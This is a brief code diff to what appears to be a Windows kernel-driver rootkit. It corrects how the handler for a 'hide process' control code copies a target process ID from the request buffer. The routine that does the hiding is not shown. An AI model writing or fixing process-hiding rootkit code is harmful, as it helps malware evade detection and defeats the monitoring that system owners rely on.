@@ -88,7 +88,7 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
             break;
 
         case BE_IOCTL_HIDE_PROCESS:
-            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over PID parameter from IRP buffer
+            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
             status = BeIoctlHideProcess(ULongToHandle(targetPid));
             break;
         }
